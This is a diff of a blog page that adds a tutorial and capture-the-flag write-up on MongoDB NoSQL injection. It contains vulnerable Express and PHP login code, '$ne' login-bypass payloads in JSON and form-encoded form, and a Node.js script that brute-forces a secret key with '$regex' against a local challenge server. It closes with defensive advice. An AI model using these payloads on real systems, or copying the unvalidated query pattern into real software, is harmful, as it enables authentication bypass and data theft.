@@ -55,15 +55,128 @@
         </span>
     </div>
     <div class="entry-content">
-        <h2 id="toc_0">End</h2>
+        <p>In the <a href="http://tinple.io/tech/mongo-security-part-one">last post</a> I showed the MongoDB unauthorized access vulnerability,
+though it&#39;s easily ignored, but it can cause huge losses if it reveals something sensitive. And this post will talk about
+somthing about blind nosql injection in MongoDB.</p>
+<p>In an <a href="http://tinple.io/tech/securing-web-application-1">early post</a> I talked about traditional SQL injection and the 
+defence. Actually, this classic attack is still wildly used in modern web applications. Not like traditional SQL, 
+NoSQL like MongoDB eliminate the SQL language entirely and relay more on simple and structured query mechanism.</p>
+<p>The SQL statement we used to query something like user login may like this in MongoDB:</p>
+<div class="highlight"><pre><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">user</span><span class="o">:</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">pass</span><span class="o">:</span> <span class="nx">password</span><span class="p">});</span>
+</pre></div>
+<p>We can see that it&#39;s no longer a query language in the form of a string, and we may think it can&#39;t be injected,
+and we may ignore the security of data, without check or filter. However, there are still many factors at play.</p>
+
+<h2 id="toc_0">application/json</h2>
+<p>In <a href="https://www.ietf.org/rfc/rfc2616.txt">HTTP 1.1</a>, when post datas, header <code>Content-Type</code> has a MIME Type value called 
+<code>application/json</code>, which will tell the server that the coming data is a JSON document. And some servers will know how to 
+deal with the data. So what will happen if we post data like this:</p>
+
+<pre><code>{
+    &quot;username&quot;: {&quot;$ne&quot;: &quot;&quot;},
+    &quot;password&quot;: {&quot;$ne&quot;: &quot;&quot;}
+}</code></pre>
+<p>If you use <code>Express</code> in <code>node</code>, your vulnerable code of the post request will look more or less like this:</p>
+<div class="highlight"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">).</span><span class="nx">json</span><span class="p">());</span> <span class="c1">// support application/json</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">user</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">pass</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">users</span><span class="p">)</span> <span class="p">{});</span>
+<span class="p">})</span>
+</pre></div>
+<p>Actually, the result is we get this login bypass, that means, the nosql injection succeeds. So how it works?
+We post the <code>username</code> and <code>password</code> values a JSON document instead of a string, and the server-side receive the
+data without validation and parse it. In  <code>MongoDB</code>, the field <code>$ne</code> has a special meaning, which is used as not 
+equal to comparator. Hence, the <code>username</code> and <code>password</code> from the database will be compared to the empty string 
+<code>&quot;&quot;</code> and the result will return true, just like the query in <code>mongo shell</code> below:</p>
+<div class="highlight"><pre><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">user</span><span class="o">:</span> <span class="p">{</span><span class="s2">&quot;$ne&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">},</span> <span class="nx">pass</span><span class="o">:</span> <span class="p">{</span><span class="nx">$ne</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">}})</span>
+</pre></div>
+<p>OK, we just bypass the login using a JSON document, because the module <a href="https://github.com/expressjs/body-parser">body-parse</a> used in <code>Express</code> supports json parse.
+In <code>PHP</code>, the data can&#39;t be operated directly, you should get the data from <code>php://input</code>, and then use <code>json_decode</code> 
+to get object.</p>
+<div class="highlight"><pre><span class="x">$input = file_get_contents(&quot;php://input&quot;);</span>
+<span class="x">$obj = json_decode($input); // and now we get the post obj</span>
+<span class="x">$cusor = $collection-&gt;find(array(&quot;user&quot;=&gt;$obj-&gt;username, &quot;pass&quot;=&gt;$obj-&gt;password));</span>
+</pre></div>
+
+<h2 id="toc_1">application/x-www-form-urlencoded</h2>
+<p>Actually, I use <code>application/json</code> to bypass the login above just for the clear explain about our nosql injection.
+And <code>application/json</code> is not used wildly, instead, we use <code>application/x-www-form-urlencoded</code> frequently. When we
+post data like this:</p>
+
+<pre><code>username[$ne]=''&amp;password[$ne]=''</code></pre>
+<p><code>PHP</code> will auto parse our data and the <code>username</code> and <code>password</code> field will be a array that contains the key <code>$ne</code>,
+and the inject happens. In <code>Express</code>, the string like <code>username[$ne]=&#39;&#39;</code> will also be parsed by a module called
+<a href="https://github.com/hapijs/qs">qs</a>, and the request will result into a javascript object like this:</p>
+
+<pre><code>{
+    username: {$ne: ''},
+    password: {$ne: ''}
+}</code></pre>
+<p>It&#39;s the same as the object we used before, and the result is also the same. So we have got the login bypass already
+now. Actually, I enhance this nosql injection in <code>hctf</code> named <code>lock(400)</code>. The source code of <code>lock</code> is available in 
+<a href="https://github.com/Tinple/mongo-attack-example">github</a>. I strongly recommend you should have a look about it. </p>
+<p>Yeah, it&#39;s the same as something like login, but only the <code>lock</code> field is injectable and the <code>password</code> is hashed. 
+However, we could get the information from source code comment that the key is the same as the lock. So our hack can 
+be improved by using <a href="http://docs.mongodb.org/manual/reference/operator/query/regex/">$regex</a> in MongoDB.</p>
+
+<pre><code>lock[$regex]=''&amp;pass=''</code></pre>
+<p>And now we can bruteforce it to get the correct password. The payload is below:</p>
+
+<pre><code>var request = require('request');
+var util = require('util-crack');
+var url = 'http://127.0.0.1:49090';
+var ret = [];
+var ret2 = [];
+
+function LeftToRight (ret) {
+  var s = util.random(null, 1);
+  var lock = {&quot;$regex&quot;: &quot;^&quot; + ret.join('') + s + &quot;.&quot;}
+  request.post(url, {form:{lock: lock, key: lock}}, function (err, res, body) {
+    if (/Right/.test(body)) {
+      ret.push(s);
+      console.log('LeftToRight: ' + ret.join(''))
+      LeftToRight(ret);
+    } else {
+      LeftToRight(ret);
+    }
+  });
+}
+
+function RightToLeft (ret2) {
+  var s = util.random(null, 1);
+  var lock = {&quot;$regex&quot;: &quot;.&quot; + s + ret2.join('') + &quot;$&quot;}
+  request.post(url, {form:{lock: lock, key: lock}}, function (err, res, body) {
+    if (/Right/.test(body)) {  
+      ret2.unshift(s);
+      console.log('RightToLeft: ' + ret2.join(''));
+      RightToLeft(ret2);
+    } else {
+      RightToLeft(ret2);
+    }
+  });
+}
+
+LeftToRight(ret)
+RightToLeft(ret2)</code></pre>
+<p>You can get the ultima right key and lock comparing the last <code>LeftToRight</code> and <code>RightToLeft</code> result.</p>
+
+<h2 id="toc_2">End</h2>
+<p>So, we can see that it&#39;s easily get mongo injected if the server receive the data without any validation. Some measures
+can be available to defense such nosql inject attack.</p>
+
+<ul>
+<li>Make sure the coming data is expected, always <strong>validate the data</strong> that user input.</li>
+<li>Hash the sensitive data with <a href="http://tinple.io/tech/salt">salt</a>.</li>
+<li><strong>Check strictly</strong> if you really want the coming data special such as a JSON document. Maybe you can have a look about <a href="https://github.com/vkarpov15/mongo-sanitize">mongo-sanitize</a> </li>
+</ul>
 <p>If you have something to correct, welcome to point it out:D</p>
 
-<h3 id="toc_1">References:</h3>
+<h3 id="toc_3">References:</h3>
 
 <ul>
 <li><a href="http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html">Attacking NodeJS and MongoDB</a></li>
 <li><a href="http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">Hacking NodeJS and MongoDB</a></li>
 <li><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">Testing for NoSQL injection</a></li>
+<li><a href="http://www.freeformatter.com/mime-types-list.html">mime-type-list</a></li>
 </ul>
 
     </div>
